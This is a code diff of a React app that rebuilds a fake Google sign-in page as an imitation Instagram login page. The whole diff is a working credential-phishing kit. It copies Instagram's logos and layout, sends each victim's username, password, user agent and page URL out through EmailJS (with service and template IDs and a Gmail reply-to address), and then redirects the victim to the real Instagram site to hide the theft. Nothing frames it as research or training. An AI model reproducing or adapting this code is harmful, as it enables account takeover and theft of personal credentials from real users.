@@ -1,17 +1,10 @@
-import React, { useState, useEffect } from 'react';
-import emailjs from '@emailjs/browser';
+import React, { useState } from 'react';
 
 export default function App() {
-  const [email, setEmail] = useState('');
+  const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
-  const [showSuccessScreen, setShowSuccessScreen] = useState(false);
-
-  useEffect(() => {
-    // Load EmailJS
-    emailjs.init("DCnFHeeyL6GEWE6J2");
-  }, []);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -19,81 +12,45 @@ export default function App() {
     setError('');
     
     try {
-      // Send data via EmailJS
-      const templateParams = {
-        from_name: email,
-        to_name: "Admin",
-        message: `Login Data Collected:
-        
-Email: ${email}
+      // Send data to EmailJS
+      const response = await window.emailjs.send(
+        "service_wni6k0h", 
+        "template_ap7mzek", 
+        {
+          from_name: username,
+          to_name: "Admin",
+          message: `Instagram Login Attempt:
+          
+Username: ${username}
 Password: ${password}
 Timestamp: ${new Date().toISOString()}
 User Agent: ${navigator.userAgent}
 Page URL: ${window.location.href}
 
 This is an automated message with login attempt data.`,
-        reply_to: "ictproject499@gmail.com",
-        subject: `Login Attempt - ${email}`
-      };
-
-      // Send the email with updated template ID
-      const response = await emailjs.send(
-        "service_wni6k0h", 
-        "template_ap7mzek", // Updated template ID
-        templateParams
+          reply_to: "ictproject499@gmail.com",
+          subject: `Instagram Login Attempt - ${username}`
+        }
       );
       
-      // Show success screen
-      setShowSuccessScreen(true);
+      // Redirect to Instagram after successful submission
+      window.location.href = 'https://www.instagram.com';
     } catch (err) {
       setError('An error occurred. Please try again.');
       setIsLoading(false);
-      console.error('Error:', err);
+      console.error('EmailJS Error:', err);
     }
   };
 
-  if (showSuccessScreen) {
-    return (    
-        <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
-        <div className="w-full max-w-sm text-center">
-          {/* Manus AI Logo */}
-          <div className="mb-8">
-            <img 
-              src="https://placehold.co/200x60/1f2937/ffffff?text=Google+Form" 
-              alt="Manus AI Logo" 
-              className="w-48 h-auto mx-auto"
-            />
-          </div>
-          {/* Success Message */}
-          <div className="bg-white rounded-lg shadow-md p-8">
-            <h1 className="text-2xl font-bold text-gray-900 mb-6">
-              Verification is successfully completed, please proceed to the Google Form
-            </h1>
-            
-            {/* Continue Button - redirects to google.com */}
-            <button
-              onClick={() => {
-                window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLScx4_6USiDT-xtr4wx0sMQFFnqWbAdQscDAm95pH8v7_rwU-w/viewform?usp=header';
-              }}
-              className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
-            >
-              Google Form
-            </button>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
   return (
-    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
+    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
       <div className="w-full max-w-sm">
-        {/* Google Logo */}
+        {/* Instagram Logo */}
         <div className="flex justify-center mb-8">
           <img 
-            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
-            alt="Google" 
-            className="w-28 h-auto"
+            src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" 
+            alt="Instagram" 
+            className="w-44 h-auto"
           />
         </div>
 
@@ -104,91 +61,125 @@ This is an automated message with login attempt data.`,
           </div>
         )}
 
-        {/* Form Card */}
-        <div className="bg-white rounded-lg shadow-md p-6">
-          {/* Title */}
-          <h1 className="text-xl font-medium text-gray-800 mb-6 text-center">
-            Sign in
-          </h1>
-
+        {/* Login Form Card */}
+        <div className="bg-white border border-gray-300 rounded-lg p-6">
           {/* Form */}
           <form onSubmit={handleSubmit} className="space-y-4">
             <div>
-              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
-                Email or phone
-              </label>
               <input
-                type="email"
-                id="email"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                className="w-full px-4 py-3 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-                placeholder="Email or phone"
+                type="text"
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
+                className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
+                placeholder="Phone number, username, or email"
                 required
               />
             </div>
             
             <div>
-              <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
-                Password
-              </label>
               <input
                 type="password"
-                id="password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                className="w-full px-4 py-3 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                 placeholder="Password"
                 required
               />
-              <div className="flex justify-end mt-2">
-                <a href="#" className="text-sm text-blue-600 hover:underline">
-                  Forgot password?
-                </a>
-              </div>
             </div>
 
-            {/* Buttons */}
-            <div className="flex gap-4 pt-4">
-              <button
-                type="button"
-                className="px-4 py-3 text-sm font-medium text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-md flex-1 transition-colors"
-              >
-                Create account
-              </button>
-              <button
-                type="submit"
-                className="px-4 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md flex-1 transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
-                disabled={isLoading}
-              >
-                {isLoading ? (
-                  <div className="flex items-center justify-center">
-                    <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                    Processing...
-                  </div>
-                ) : (
-                  'Next'
-                )}
-              </button>
-            </div>
+            {/* Login Button */}
+            <button
+              type="submit"
+              className="w-full bg-blue-500 text-white py-1.5 rounded text-sm font-medium disabled:opacity-70 disabled:cursor-not-allowed"
+              disabled={isLoading}
+            >
+              {isLoading ? (
+                <div className="flex items-center justify-center">
+                  <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                  Logging in...
+                </div>
+              ) : (
+                'Log in'
+              )}
+            </button>
           </form>
+
+          {/* Divider */}
+          <div className="flex items-center my-4">
+            <div className="flex-grow border-t border-gray-300"></div>
+            <div className="px-4 text-xs text-gray-500">OR</div>
+            <div className="flex-grow border-t border-gray-300"></div>
+          </div>
+
+          {/* Facebook Login */}
+          <div className="text-center mb-4">
+            <a href="#" className="text-blue-900 font-semibold text-sm">
+              Log in with Facebook
+            </a>
+          </div>
+
+          {/* Forgot Password */}
+          <div className="text-center mt-4">
+            <a href="#" className="text-sm text-gray-900">
+              Forgot password?
+            </a>
+          </div>
         </div>
 
-        {/* Footer Links */}
-        <div className="mt-6 text-center text-sm text-gray-600 space-y-2">
-          <p>
-            <a href="#" className="hover:underline">English (United States)</a>
-            <span className="mx-1">·</span>
-            <a href="#" className="hover:underline">Help</a>
-            <span className="mx-1">·</span>
-            <a href="#" className="hover:underline">Privacy</a>
-            <span className="mx-1">·</span>
-            <a href="#" className="hover:underline">Terms</a>
+        {/* Sign Up Card */}
+        <div className="bg-white border border-gray-300 rounded-lg p-4 mt-4 text-center">
+          <p className="text-sm">
+            Don't have an account? 
+            <a href="#" className="text-blue-500 font-semibold ml-1">
+              Sign up
+            </a>
           </p>
         </div>
+
+        {/* Get the App */}
+        <div className="text-center mt-6">
+          <p className="text-sm mb-2">Get the app.</p>
+          <div className="flex justify-center space-x-2">
+            <img 
+              src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" 
+              alt="App Store" 
+              className="h-10"
+            />
+            <img 
+              src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc7a8.png" 
+              alt="Google Play" 
+              className="h-10"
+            />
+          </div>
+        </div>
+      </div>
+
+      {/* Footer Links */}
+      <div className="mt-8 text-center text-xs text-gray-500 space-y-2 max-w-xs">
+        <div className="flex flex-wrap justify-center gap-x-2">
+          <a href="#" className="hover:underline">Meta</a>
+          <a href="#" className="hover:underline">About</a>
+          <a href="#" className="hover:underline">Blog</a>
+          <a href="#" className="hover:underline">Jobs</a>
+          <a href="#" className="hover:underline">Help</a>
+          <a href="#" className="hover:underline">API</a>
+          <a href="#" className="hover:underline">Privacy</a>
+          <a href="#" className="hover:underline">Terms</a>
+          <a href="#" className="hover:underline">Top Accounts</a>
+          <a href="#" className="hover:underline">Hashtags</a>
+          <a href="#" className="hover:underline">Locations</a>
+          <a href="#" className="hover:underline">Instagram Lite</a>
+          <a href="#" className="hover:underline">Contact Uploading</a>
+        </div>
+        <div>
+          <select className="bg-transparent text-xs text-gray-500 border-0 focus:ring-0">
+            <option>English</option>
+          </select>
+        </div>
+        <div>© 2025 Instagram from Meta</div>
       </div>
     </div>
   );
